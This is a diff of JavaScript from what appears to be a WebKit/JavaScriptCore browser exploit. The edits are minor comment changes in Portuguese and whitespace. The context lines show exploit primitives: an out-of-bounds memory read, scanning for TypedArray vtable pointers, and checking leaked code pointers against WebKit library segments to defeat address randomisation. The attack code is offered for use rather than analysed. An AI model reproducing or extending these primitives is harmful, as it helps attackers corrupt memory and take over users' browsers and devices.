@@ -48,9 +48,10 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
         vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
-        // O log de depuração DEBUG_CORE_READ8 em Core.oob_read_relative já nos dá o status da criação.
-        // Podemos adicionar um log aqui para o valor recebido pelo VictimFinder:
+        // Log de DEBUG_CORE_READ8 em Core.oob_read_relative já dá detalhes sobre a criação.
+        // Log adicional no VictimFinder para ver o que ele recebeu:
         logFn(`DEBUG_TA_VTABLE_RECEIVED @ ${toHexS1(currentCandidateBaseRelOffset)}: isAdvInt64Obj=${isAdvancedInt64Object(vtable_ptr)}, val=${isAdvancedInt64Object(vtable_ptr) ? vtable_ptr.toString(true) : String(vtable_ptr)}`, 'info', FNAME_BASE);
+
 
         let vtableMatch = false;
         if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0 && isAdvancedInt64Object(vtable_ptr)) {
@@ -118,7 +119,6 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
         logFn(`DEBUG_CP_PTR_RECEIVED @ ${toHexS1(currentCandidateBaseRelOffset)}: isAdvInt64Obj=${isAdvancedInt64Object(potentialPtr)}, val=${isAdvancedInt64Object(potentialPtr) ? potentialPtr.toString(true) : String(potentialPtr)}`, 'info', FNAME_BASE);
 
         if (isAdvancedInt64Object(potentialPtr) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
-            // ... (lógica de verificação de ponteiro de código como antes)
             if (leakedWebKitBaseAddress) {
                 for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                     const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
